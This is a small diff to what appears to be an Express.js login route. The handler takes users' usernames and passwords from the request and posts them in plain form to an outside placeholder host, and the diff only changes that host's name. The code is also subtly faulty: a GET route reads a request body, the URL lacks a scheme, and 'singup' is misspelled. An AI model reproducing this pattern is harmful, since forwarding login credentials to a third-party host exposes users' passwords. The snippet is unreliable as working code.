@@ -52,7 +52,7 @@
   app.get("/login", function(req, res) {
       const username = req.body.username
       const password = req.body.password
-      axios.post('www.blablasomething.com/singup', {
+      axios.post('www.blablasomething1.com/singup', {
         username: username,
         password: password
       })
